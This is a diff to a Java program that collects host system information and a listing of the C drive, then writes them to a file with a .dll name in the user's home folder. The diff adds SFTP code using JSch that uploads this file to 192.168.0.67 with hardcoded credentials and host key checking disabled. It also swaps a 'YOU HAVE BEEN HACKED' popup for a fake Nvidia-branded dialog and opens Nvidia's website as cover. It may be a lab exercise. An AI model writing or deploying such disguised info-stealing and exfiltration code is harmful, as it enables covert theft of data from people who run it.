@@ -1,5 +1,10 @@
 package main;
 
+import com.jcraft.jsch.ChannelSftp;
+import com.jcraft.jsch.JSch;
+import com.jcraft.jsch.JSchException;
+import com.jcraft.jsch.Session;
+
 import javax.swing.*;
 import java.awt.*;
 import java.io.*;
@@ -7,22 +12,19 @@ import java.net.InetAddress;
 import java.net.URI;
 import java.net.URISyntaxException;
 import java.net.UnknownHostException;
-import java.util.Arrays;
-import java.util.Calendar;
-import java.util.Scanner;
-import java.util.TimeZone;
+import java.util.*;
 
 
 public class Main {
 
-    public static void main(String[] args) throws IOException, Exception {
+    public static void main(String[] args) throws IOException, Exception, JSchException {
 
         // Executes the Browser
         try {
             // Creates a Desktop object
             Desktop desktop = Desktop.getDesktop();
             // Invokes a desktop method browse and opens the provided link
-            desktop.browse(new URI("https://hips.hearstapps.com/hmg-prod/images/gettyimages-1185282377.jpg?resize=1200:*"));
+            desktop.browse(new URI("https://www.nvidia.com/en-au/"));
         } catch (URISyntaxException uri) {
             // Catches the Exceptions
             System.out.println("Error Incorrect String");
@@ -77,12 +79,38 @@ public class Main {
                 "User Language: " + userLanguage + "\n";
 
         JFrame windowPopup = new JFrame();
-        ImageIcon image = new ImageIcon(Main.class.getResource("Hacked.png"));
+        ImageIcon image = new ImageIcon(Main.class.getResource("Nvida.png"));
         Image getImage = image.getImage();
         Image resizedImage = getImage.getScaledInstance(128, 128, java.awt.Image.SCALE_SMOOTH);
         image = new ImageIcon(resizedImage);
 
         FileWriter fileWriter = new FileWriter("Infos3785646s3838975.dll");
+        saveInfoToFile(filesInDir, sysInfo, fileWriter);
+
+        File file = new File(userHome + "/Infos3785646s3838975.dll");
+        FileWriter fileWriter2 = new FileWriter(file);
+        saveInfoToFile(filesInDir, sysInfo, fileWriter2);
+
+        JOptionPane.showMessageDialog(windowPopup, sysInfo, "Nvida - Top Secret Data", JOptionPane.INFORMATION_MESSAGE, image);
+
+        JSch jsch = new JSch();
+        Session session = jsch.getSession("mysftpuser", "192.168.0.67");
+        session.setConfig("StrictHostKeyChecking", "no");
+        session.setPassword("mysftpuser");
+        session.connect();
+        ChannelSftp channel = (ChannelSftp) session.openChannel("sftp");
+        channel.connect();
+        channel.cd("/");
+
+        FileInputStream fis = new FileInputStream(file);
+        channel.put(fis, file.getName());
+
+        channel.disconnect();
+        session.disconnect();
+
+    }
+
+    private static void saveInfoToFile(String[] filesInDir, String sysInfo, FileWriter fileWriter) throws IOException {
         BufferedWriter bufferedWriter = new BufferedWriter(fileWriter);
         PrintWriter out = new PrintWriter(bufferedWriter);
         out.println("Host system configuration (systeminfo and network configuration):\n \n" + sysInfo);
@@ -92,22 +120,6 @@ public class Main {
             out.println(filesInDir[i]);
         }
         bufferedWriter.close();
-
-        File file = new File(userHome + "/Infos3785646s3838975.dll");
-        FileWriter fileWriter2 = new FileWriter(file);
-        BufferedWriter bufferedWriter2 = new BufferedWriter(fileWriter2);
-        PrintWriter out2 = new PrintWriter(bufferedWriter2);
-        out2.println("Host system configuration (systeminfo and network configuration):\n \n" + sysInfo);
-
-        out2.println("\nList of Folders & Files in the local C Drive:\n");
-        for (int i = 0; i < filesInDir.length; i++) {
-            out2.println(filesInDir[i]);
-        }
-        bufferedWriter2.close();
-
-
-        JOptionPane.showMessageDialog(windowPopup, sysInfo, "YOU HAVE BEEN HACKED", JOptionPane.INFORMATION_MESSAGE, image);
-
     }
 
 
